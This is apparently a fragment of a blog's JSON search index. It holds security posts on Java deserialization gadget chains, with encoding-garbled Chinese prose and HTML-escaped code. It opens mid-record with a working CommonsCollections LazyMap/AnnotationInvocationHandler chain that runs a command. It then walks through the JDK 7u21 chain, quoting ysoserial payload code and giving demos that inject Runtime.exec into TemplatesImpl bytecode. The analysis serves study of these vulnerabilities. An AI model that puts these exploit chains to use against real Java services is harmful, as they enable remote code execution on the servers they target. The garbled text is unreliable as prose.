org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class test2 &#123; public static void main(String[] args) throws Exception &#123; org.apache.commons.collections.Transformer[] transformers &#x3D; new org.apache.commons.collections.Transformer[]&#123; &#x2F;&#x2F; åŒ…è£…å¯¹è±¡ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123; &quot;getRuntime&quot;, null, &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123; null, null, &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123; &quot;calc&quot; &#125;), &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers); Map innermap &#x3D; new HashMap(); Map outermap &#x3D; LazyMap.decorate(innermap, chainedTransformer); Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor cons &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true);&#x2F;&#x2F;å¦™å¤„ InvocationHandler handler &#x3D; (InvocationHandler) cons.newInstance(Override.class,outermap);&#x2F;&#x2F;è·å¾—ä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡ Map Prox &#x3D; (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªMapçš„ä»£ç†ç±»ï¼Œå…¶ä»£ç†æ–¹æ³•ä¸ºAnnotationInvocationHandlerå¯¹è±¡é‡Œçš„invokeæ–¹æ³• InvocationHandler handler1 &#x3D; (InvocationHandler) cons.newInstance(Override.class,Prox); &#x2F;&#x2F;å°†ä»£ç†Mapä¼ å…¥ï¼Œå½“ä»£ç†Mapè¢«æ‰§è¡Œä»»ä¸€æ–¹æ³•æ—¶ï¼Œæ‰§è¡Œinvokeæ–¹æ³•&#x2F;&#x2F; ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;)); a.writeObject(handler1); ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); b.readObject(); &#125;&#125;","categories":[],"tags":[{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"7u21é“¾æµ…æ","slug":"7u21é“¾æµ…æ","date":"2021-06-28T13:51:11.037Z","updated":"2021-06-28T13:48:09.627Z","comments":true,"path":"2021/06/28/7u21é“¾æµ…æ/","link":"","permalink":"http://const27.com/2021/06/28/7u21%E9%93%BE%E6%B5%85%E6%9E%90/","excerpt":"","text":"ç®€ä»‹jdk7u21 é“¾ï¼Œæ˜¯ä¸€ä¸ªä¸éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹åº“å°±èƒ½å®ç°çš„é“¾ã€‚å½±å“ç‰ˆæœ¬&lt;=7u21 åˆ†æfrom ysonerialæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ysonerialé‡Œçš„payloadæ˜¯æ€ä¹ˆå†™çš„ï¼Œç„¶åæ²¿ç€å…¶æ€è·¯è¿›è¡Œåˆ†æ public Object getObject(String command) throws Exception &#123; Object templates &#x3D; Gadgets.createTemplatesImpl(command); String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;; HashMap map &#x3D; new HashMap(); map.put(zeroHashCodeStr, &quot;foo&quot;); InvocationHandler tempHandler &#x3D; (InvocationHandler)Reflections.getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class); Templates proxy &#x3D; (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]); LinkedHashSet set &#x3D; new LinkedHashSet(); set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, (Object)null); Reflections.setFieldValue(templates, &quot;_class&quot;, (Object)null); map.put(zeroHashCodeStr, templates); return set;&#125; TemplatesImplæˆ‘ä»¬çœ‹åˆ°ï¼Œysonerialçš„payloadä¸Šæ¥å°±é€šè¿‡Gadgets.createTemplatesImpl(command) è¯•å›¾åˆ›å»ºä¸€ä¸ªTemplatesImplç±»ã€‚createTemplatesImplæºç å¦‚ä¸‹ï¼Œæˆ‘ä»¬å‘ç°åˆ›å»ºTemplatesImplç±»ååˆé€šè¿‡åå°„å’Œjavassiståšäº†è®¸å¤šæ“ä½œã€‚ public static &lt;T&gt; T createTemplatesImpl(String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory) throws Exception &#123; T templates &#x3D; tplClass.newInstance(); ClassPool pool &#x3D; ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); CtClass clazz &#x3D; pool.get(Gadgets.StubTransletPayload.class.getName()); String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\\&quot;&quot; + command.replaceAll(&quot;\\\\\\\\&quot;, &quot;\\\\\\\\\\\\\\\\&quot;).replaceAll(&quot;\\&quot;&quot;, &quot;\\\\\\&quot;&quot;) + &quot;\\&quot;);&quot;; clazz.makeClassInitializer().insertAfter(cmd); clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime()); CtClass superC &#x3D; pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); byte[] classBytes &#x3D; clazz.toBytecode(); Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;); Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;); Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance()); return templates;&#125; é‚£ä¹ˆä¸ºä»€ä¹ˆè¦åˆ›å»ºè¿™ä¸ªç±»å¹¶ä¸”è°ƒç”¨åå°„å’Œjavassistæœºåˆ¶å‘¢ï¼Ÿå…ˆä¸æ€¥ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹TemplatesImplæºç ã€‚ é¦–å…ˆTemplatesImplç±»ä¸­æœ‰ä¸ªæ–¹æ³•defineTransletClassesï¼Œå®ƒçš„ä¸»è¦ä»£ç å¦‚ä¸‹ private byte[][] _bytecodes &#x3D; (byte[][])null;private void defineTransletClasses() throws TransformerConfigurationException &#123; if (this._bytecodes &#x3D;&#x3D; null) &#123; ..... &#125; else &#123; TemplatesImpl.TransletClassLoader loader &#x3D; (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); &#125; &#125;); try &#123; int classCount &#x3D; this._bytecodes.length; this._class &#x3D; new Class[classCount]; for(int i &#x3D; 0; i &lt; classCount; ++i) &#123; this._class[i] &#x3D; loader.defineClass(this._bytecodes[i]); \\\\å°†_bytecodesä¸­çš„æ‰€æœ‰å­—èŠ‚é€šè¿‡defineClassè½¬åŒ–ä¸ºä¸€ä¸ªç±» Class superClass &#x3D; this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; this._transletIndex &#x3D; i; &#125; else &#123; this._auxClasses.put(this._class[i].getName(), this._class[i]); &#125; &#125; &#125; ä¹Ÿå°±æ˜¯è¯´é€šè¿‡è¿™ä¸ªæ–¹æ³•å¯ä»¥å°†_bytecodesæ•°ç»„ä¸­çš„å­—èŠ‚è¿˜åŸæˆä¸€ä¸ªç±»ï¼Œå­˜å‚¨åˆ°_classå˜é‡ä¸­ã€‚æ¥ä¸‹æ¥å¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°è°ƒç”¨defineTransletClassesæ–¹æ³•å¹¶æ‰§è¡Œäº†_class[].newinstance() è¿™æ ·çš„çš„ä»£ç çš„æ–¹æ³•ï¼Œå°±èƒ½å®ä¾‹åŒ–ä»å­—èŠ‚å¾—åˆ°çš„ç±»äº†ï¼Œä»è€Œå°±èƒ½æ‰§è¡Œç±»ä¸­çš„é™æ€ä»£ç å—å’Œæ„é€ å‡½æ•°äº†ï¼æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾è¿™ç§æ–¹æ³•ã€‚é€šè¿‡æœç´¢defineTransletClassesï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æœ‰å¦‚ä¸‹ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨äº†defineTransletClassesæ–¹æ³•ï¼š getTransletInstancegetTransletIndexgetTransletClasses å…¶ä¸­ï¼ŒgetTransletInstanceæ–¹æ³•æ˜¯å”¯ä¸€ç¬¦åˆâ€œè°ƒç”¨äº†defineTransletClassesä¸”æœ‰_class[].newinstance()â€çš„æ–¹æ³•ï¼Œå…¶ä»£ç å¦‚ä¸‹ private Translet getTransletInstance() throws TransformerConfigurationException &#123; ErrorMsg err; try &#123; if (this._name &#x3D;&#x3D; null) &#123; return null; &#125; else &#123; if (this._class &#x3D;&#x3D; null) &#123; this.defineTransletClasses(); &#125; AbstractTranslet translet &#x3D; (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses !&#x3D; null) &#123; translet.setAuxiliaryClasses(this._auxClasses); &#125; return translet; &#125; é‚£ä¹ˆï¼ŒgetTransletInstanceæ˜¯ä¸€ä¸ªprivateæ–¹æ³•ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨å®ƒï¼Œåœ¨é‚£é‡Œèƒ½å»è°ƒç”¨å®ƒå‘¢ï¼Ÿç­”æ¡ˆæ˜¯newTransformeræ–¹æ³• public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123; TransformerImpl transformer &#x3D; new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\hereÂ·Â·Â·Â·Â·Â·Â·Â· &#125; OK.æˆ‘ä»¬æ‰¾åˆ°äº†è§¦å‘7u21é“¾çš„ä¸€ä¸ªæ ¸å¿ƒç‚¹äº†ã€‚æˆ‘ä»¬å†™ä¸ªå°demoæ¥é€šè¿‡TemplatesImplå®ç°ä»£ç æ‰§è¡Œå°demoçš„å®ç°æ€è·¯ä¸ºï¼šé€šè¿‡javassiståŠ¨æ€ç”Ÿæˆä¸€ä¸ªæ¶æ„ç±»ï¼ˆæ„é€ æ–¹æ³•æˆ–è€…é™æ€ä»£ç å—æœ‰æ¶æ„ä»£ç ï¼‰ï¼Œç„¶åé€šè¿‡åå°„ç”Ÿæˆä¸€ä¸ªTemplatesImplå¯¹è±¡å¹¶è®¾ç½®å„ä¸ªå˜é‡çš„å€¼ï¼Œç„¶åè°ƒç”¨ä¸€ä¸‹TemplatesImplå¯¹è±¡çš„newTransformeræ–¹æ³•å³å¯é€ æˆä»£ç æ‰§è¡Œï¼Œä»£ç å¦‚ä¸‹ public class test&#123; public static void main(String[] args) throws Exception &#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;); String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); \\\\å‘é™æ€ä»£ç å—æ’å…¥æ¶æ„ä»£ç ï¼Œæ’å…¥åˆ°æ„é€ å‡½æ•°ä¹Ÿå¯ä»¥ cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); \\\\éœ€è®¾ç½®æ­¤é¡¹æ‰èƒ½å®ç°newinstanceï¼Œå…·ä½“åŸå› è¯·çœ‹defineTransletClasseså’ŒgetTransletInstanceæºç  cc.setName(&quot;evilClass&quot;); byte[] evilbytes &#x3D; cc.toBytecode(); byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;; TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance(); Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for (Field Field : Fields) &#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„ try &#123; Field.setAccessible(true); &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—® if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123; Field.set(templates,targetByteCodes); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123; Field.set(templates,null); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123; Field.set(templates,&quot;abc&quot;); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123; Field.set(templates,new TemplatesImpl()); &#125; &#125; catch (Exception e) &#123;&#125; &#125; templates.newTransformer(); &#125;&#125; ä½†ä»…ä»…æ˜¯è¿™æ ·ï¼Œè‚¯å®šæ˜¯ä¸å¤Ÿçš„ã€‚ AnnotationInvocationHandleræˆ‘ä»¬ç»§ç»­çœ‹ysoserialæºç å¯ä»¥çœ‹åˆ°åŠ¨ç”¨äº†AnnotationInvocationHandlerè¿™ä¸ªä¸œè¥¿.è¿™ä¸ªç±»åŸæœ¬çš„ä½œç”¨æ˜¯ä½œä¸ºAnnotation ç±»çš„åŠ¨æ€ä»£ç† æˆ‘ä»¬æŠŠç›®å…‰èšç„¦äºinvokeæ–¹æ³•â€”â€”åŠ¨æ€ä»£ç†çš„æ ¸å¿ƒ public Object invoke(Object var1, Method var2, Object[] var3) &#123; String var4 &#x3D; var2.getName(); Class[] var5 &#x3D; var2.getParameterTypes(); if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length &#x3D;&#x3D; 1 &amp;&amp; var5[0] &#x3D;&#x3D; Object.class) &#123; return this.equalsImpl(var3[0]); &#125; .......... &#125; å®ƒä¼šæ£€æµ‹ä¼ å…¥çš„æ–¹æ³•ä¸­æ˜¯å¦æœ‰ç¬¦åˆ åä¸ºequalsï¼Œåªæœ‰ä¸€ä¸ªObjectç±»å‹å‚æ•°ã€‚è‹¥æ˜¯ï¼Œåˆ™è°ƒç”¨equalsImplæ–¹æ³•å¹¶ä¼ å…¥æ–¹æ³•ä¸­çš„å‚æ•°ã€‚è·Ÿè¿›equalsimplæ–¹æ³• private Boolean equalsImpl(Object var1) &#123; if (var1 &#x3D;&#x3D; this) &#123; return true; &#125; else if (!this.type.isInstance(var1)) &#123; return false; &#125; else &#123; Method[] var2 &#x3D; this.getMemberMethods(); int var3 &#x3D; var2.length; for(int var4 &#x3D; 0; var4 &lt; var3; ++var4) &#123; Method var5 &#x3D; var2[var4]; String var6 &#x3D; var5.getName(); Object var7 &#x3D; this.memberValues.get(var6); Object var8 &#x3D; null; AnnotationInvocationHandler var9 &#x3D; this.asOneOfUs(var1); if (var9 !&#x3D; null) &#123; var8 &#x3D; var9.memberValues.get(var6); &#125; else &#123; try &#123; var8 &#x3D; var5.invoke(var1); \\\\here &#125; catch (InvocationTargetException var11) &#123; return false; &#125; catch (IllegalAccessException var12) &#123; throw new AssertionError(var12); &#125; &#125; if (!memberValueEquals(var7, var8)) &#123; return false; &#125; &#125; return true; &#125;&#125; å‘ç°ä¼šinvoke ä¼ å…¥å‚æ•°ä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ€è·¯å†™ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå°demo: åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„TemplatesImplå®ä¾‹ï¼Œé€šè¿‡AnnotationInvocationHandleråˆ›å»ºä»»æ„ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œç„¶åä»£ç†å¯¹è±¡è°ƒç”¨equalsæ–¹æ³•ä¼ å…¥å‚æ•°ä¸ºæ¶æ„TemplatesImplå¯¹è±¡ï¼Œå³å¯é€ æˆæ¶æ„ä»£ç æ‰§è¡Œçœ‹åˆ°è¿™é‡Œä¸€å®šä¸€å¤´é›¾æ°´ï¼Œçœ‹çœ‹demoä¹Ÿè®¸ä¼šå¥½ä¸€ç‚¹ public class test&#123; public static void main(String[] args) throws Exception &#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;); String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc); cons.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(&quot;evilClass&quot;); byte[] evilbytes &#x3D; cc.toBytecode(); byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;; TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance(); Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for (Field Field : Fields) &#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„ try &#123; &#x2F;&#x2F;æ‰§è¡Œget()æ–¹æ³•æ—¶éœ€æŠ›å‡ºIllegalAccessExceptioné”™è¯¯ Field.setAccessible(true); &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—® if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123; Field.set(templates,targetByteCodes); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123; Field.set(templates,null); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123; Field.set(templates,&quot;abc&quot;); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123; Field.set(templates,new TemplatesImpl()); &#125; &#125; catch (Exception e) &#123;&#125; &#125; &#x2F;&#x2F;ä»¥ä¸Šä»£ç ç”Ÿæˆäº†æ¶æ„TemplatesImplå¯¹è±¡templates Map map &#x3D; new HashMap(); final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0]; &#x2F;&#x2F;è·å¾—AnnotationInvocationHandleræ„é€ æ–¹æ³•ï¼Œæ–¹ä¾¿è·å¾—å®ƒä¸€ä¸ªå®ä¾‹ ctor.setAccessible(true); InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map); &#x2F;&#x2F;è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆè¦ä¼ å…¥Templatesç±»å¯¹è±¡è€Œä¸æ˜¯TemplatesImpl Object proxy &#x3D; Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); \\\\åæ­£åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerçš„ä»£ç†å¯¹è±¡å°±è¡Œäº†ï¼Œå‰ä¸¤ä¸ªå‚æ•°éƒ½ä¸ç”¨æ€ä¹ˆç®¡ proxy.equals(templates); &#x2F;&#x2F;æ¶æ„ä»£ç æ‰§è¡Œ &#125;&#125; æˆ‘ä»¬æ…¢æ…¢çœ‹çœ‹é€»è¾‘ï¼Œåœ¨proxy.equalså¤„ä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•æ¯«æ— ç–‘é—®ä¼šè¿›å…¥åˆ°æ­¤å¤„ï¼šAnnotationInvocationHandlerçš„invokeæ–¹æ³•ã€‚ ç„¶åå‚æ•°ç¬¦åˆifåˆ¤æ–­ï¼Œè°ƒç”¨equalsImplæ–¹æ³•ï¼Œå¹¶ä¼ å…¥å‚æ•°ä¸ºæ¶æ„TemplatesImplå¯¹è±¡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›å…¥åå°„è°ƒç”¨å¤„ éå†var2å˜é‡ä¸­çš„æ–¹æ³•ï¼Œå¹¶ç”±æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡æ¥æ‰§è¡Œã€‚ â€”â€”â€”â€”æ­¤å¤„æ’ä¸€ä¸‹var2å˜é‡çš„æ¥å† æ³¨æ„æ­¤å¤„çš„getMemberMethodsæ–¹æ³•ï¼Œå®ƒå®è´¨ä¸Šæ˜¯é€šè¿‡åå°„è·å¾—this.typeä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚è€Œthis.typeæ˜¯åœ¨è¯¥å¯¹è±¡æ„é€ æ–¹æ³•ä¸­ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚ getMemberMethodsï¼š æ„é€ æ–¹æ³•ï¼š â€”â€”â€”â€”å›åˆ°æ­£é¢˜ ç”±äºæˆ‘ä»¬é€šè¿‡åå°„ä¼ å…¥æ„é€ æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Templates.classï¼Œæ‰€ä»¥å®ƒä¼šéå†Templatesç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚è¿™ä¸ªç±»å…¶å®æ˜¯TemplatesImplçš„æ¥å£ç±»ï¼Œå®ƒçš„ä»£ç å¦‚ä¸‹ æ‰€ä»¥var2ä¸­å­˜å‚¨çš„æ–¹æ³•åªæœ‰ä¸¤ä¸ªï¼ŒnewTransformerå’ŒgetOutputPropertiesã€‚ç„¶åå½“éå†åˆ°newTransformeræ–¹æ³•æ—¶ï¼Œå°±ä¼šé€šè¿‡åå°„è°ƒç”¨è¾¾åˆ° eviltemplatesImpl.newTransformer() çš„æ•ˆæœï¼Œä»è€Œå¯¼è‡´æ¶æ„TemplatesImplå¯¹è±¡ä¸­çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚ è¿™é‡Œæ‰¿æ¥ä¸Šé¢è¯´çš„ï¼Œä¸ºä»€ä¹ˆåˆå§‹åŒ–AnnotationInvocationHandlerå¯¹è±¡æ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³this.type)æ˜¯Templates.classï¼Œè€Œä¸æ˜¯TemplatesImpl.classè¯šç„¶ï¼Œè¿™ä¸¤ä¸ªç±»å¯¹è±¡éƒ½æœ‰æ–¹æ³•newTransformerã€‚ä½†æ˜¯å¦‚æœä¼ å…¥TemplatesImpl.classï¼Œåœ¨éå†å…¶ä¸­æ–¹æ³•å¹¶é€šè¿‡åå°„æ‰§è¡Œæ—¶ä¼šå‡ºç°é”™è¯¯ï¼šequalsImplä¸­çš„åå°„è°ƒç”¨æ˜¯ä¸ä¼ å…¥å‚æ•°çš„ è€ŒTemplatesImplä¸­æœ‰è®¸å¤šéœ€è¦ä¼ å…¥å‚æ•°æ‰èƒ½è¢«æ­£å¸¸ä½¿ç”¨çš„æ–¹æ³•ï¼Œå¦‚æœä¸ä¼ å…¥å‚æ•°å°±åå°„è°ƒç”¨å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä»¥è‡³äºåœ¨éå†åˆ°newTransformeræ–¹æ³•å‰å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œä¸è¢«å®ç°ã€‚ ä»…ä»…æ˜¯è¿™æ ·ï¼Œä¹Ÿè¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—æ‰‹åŠ¨è°ƒç”¨equalsæ‰èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œï¼Œååºåˆ—åŒ–ç‚¹åœ¨å“ªé‡Œï¼Ÿ LinkedHashSetysoserialçš„payloadä¸­å‡ºç°äº†æ­¤ç±»ã€‚ LinkedHashSetç»§æ‰¿è‡ªHashSetç±»ï¼Œå®ƒçš„readObjectæ–¹æ³•ä¹Ÿæ˜¯ä»HashSetç»§æ‰¿è€Œæ¥çš„ã€‚æˆ‘ä»¬çœ‹çœ‹readObjectæ–¹æ³•çš„æ„é€  private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); int var2 &#x3D; var1.readInt(); float var3 &#x3D; var1.readFloat(); this.map &#x3D; (HashMap)(this instanceof LinkedHashSet ? new LinkedHashMap(var2, var3) : new HashMap(var2, var3)); int var4 &#x3D; var1.readInt(); for(int var5 &#x3D; 0; var5 &lt; var4; ++var5) &#123; Object var6 &#x3D; var1.readObject(); this.map.put(var6, PRESENT); &#125; &#125;&#125; å®ƒçš„ä¸»è¦äº®ç‚¹åœ¨forå¾ªç¯é‡Œé¢ï¼šéå†ä¼ å…¥çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œå°†å…¶ååºåˆ—åŒ–åï¼Œå†ä¼ å…¥putæ–¹æ³• æ‰€ä»¥æˆ‘ä»¬å†æ¥è·Ÿè¿›ä¸€ä¸‹map.putæ–¹æ³• public V put(K var1, V var2) &#123; if (var1 &#x3D;&#x3D; null) &#123; return this.putForNullKey(var2); &#125; else &#123; int var3 &#x3D; this.hash(var1); int var4 &#x3D; indexFor(var3, this.table.length); for(HashMap.Entry var5 &#x3D; this.table[var4]; var5 !&#x3D; null; var5 &#x3D; var5.next) &#123; Object var6; if (var5.hash &#x3D;&#x3D; var3 &amp;&amp; ((var6 &#x3D; var5.key) &#x3D;&#x3D; var1 || var1.equals(var6))) &#123; &#x2F;&#x2F;here Object var7 &#x3D; var5.value; var5.value &#x3D; var2; var5.recordAccess(this); return var7; &#125; &#125; ++this.modCount; this.addEntry(var3, var1, var2, var4); return null; &#125;&#125; æ³¨æ„æˆ‘ä»¬æ·»åŠ æ³¨é‡Šé‚£ä¸€è¡Œï¼Œæœ‰ä¸€ä¸ªvar1.equals(var6))) å…¶ä¸­var1å’Œvar6æˆ‘ä»¬éƒ½æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼švar1å³ä¼ å…¥çš„ååºåˆ—åŒ–å¯¹è±¡(æ¶æ„TemplatesImpl)ï¼Œvar6å®é™…ä¸Šä¹Ÿæ˜¯æˆ‘ä»¬ä¼ å…¥çš„ååºåˆ—åŒ–å¯¹è±¡ï¼ˆæ¶æ„AnnotationInvocationHandlerä»£ç†å¯¹è±¡ï¼‰ã€‚ ä½†æ˜¯æƒ³è¦æ‰§è¡Œvar1.equals(var6))) åˆ™å¿…é¡»è¦è®© var5.hash == var3 ä¸ºtrue ä¸” (var6 = var5.key) == var1ä¸ºfalse.æ€ä¹ˆåšåˆ°å‘¢ï¼Ÿ æ³¨æ„putæ–¹æ³•çš„ç¬¬5è¡Œï¼Œå¯¹ä¼ å…¥çš„ååºåˆ—åŒ–å¯¹è±¡è°ƒç”¨äº†hashæ–¹æ³•ã€‚æˆ‘ä»¬è·Ÿè¿›hashæ–¹æ³• final int hash(Object var1) &#123; int var2 &#x3D; 0; if (this.useAltHashing) &#123; if (var1 instanceof String) &#123; return Hashing.stringHash32((String)var1); &#125; var2 &#x3D; this.hashSeed; &#125; var2 ^&#x3D; var1.hashCode(); &#x2F;&#x2F;here var2 ^&#x3D; var2 &gt;&gt;&gt; 20 ^ var2 &gt;&gt;&gt; 12; return var2 ^ var2 &gt;&gt;&gt; 7 ^ var2 &gt;&gt;&gt; 4;&#125; å‘ç°ä¼šæ‰§è¡Œä¼ å…¥çš„å‚æ•°å¯¹è±¡çš„hashCode()æ–¹æ³•å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸ºæ¶æ„AnnotationInvocationHandlerä»£ç†å¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨ä»£ç†å¯¹è±¡ä¸­çš„invokeæ–¹æ³•ã€‚å¯¹äºAnnotationInvocationHandlerè€Œè¨€å½“åˆ¤æ–­åˆ°æ‰§è¡ŒhashCodeæ–¹æ³•æ—¶ï¼Œå®è´¨ä¸Šä¼šæ‰§è¡ŒAnnotationInvocationHandlerä¸­çš„hashCodeImplæ–¹æ³• æˆ‘ä»¬è·Ÿè¿›hashCodeImpl private int hashCodeImpl() &#123; int var1 &#x3D; 0; Entry var3; for(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123; var3 &#x3D; (Entry)var2.next(); &#125; return var1; &#125;ä¸Šé¢æ˜¯çœŸå®ä»£ç ï¼Œæ¯”è¾ƒéš¾çœ‹ï¼Œæ‰€ä»¥å€Ÿé‰´äº†ä¸€ä¸‹åˆ«äººå¯¹å…¶è¿›è¡Œä¿®æ”¹åçš„ä»£ç ï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œåˆ†æprivate int hashCodeImpl() &#123; int result &#x3D; 0; &#x2F;&#x2F; éå† memberValues Iterator itr &#x3D; this.memberValues.entrySet().iterator(); for( ;itr.hasNext(); ) &#123; Entry entry &#x3D; (Entry)itr.next(); String key &#x3D; ((String)entry.getKey()); Object value &#x3D; entry.getValue(); &#x2F;&#x2F; 127 * key çš„ hashCodeï¼Œå†å’Œ memberValueHashCode(value) è¿›è¡Œå¼‚æˆ– result +&#x3D; 127 * key.hashCode() ^ memberValueHashCode(value); &#125; return result;&#125; 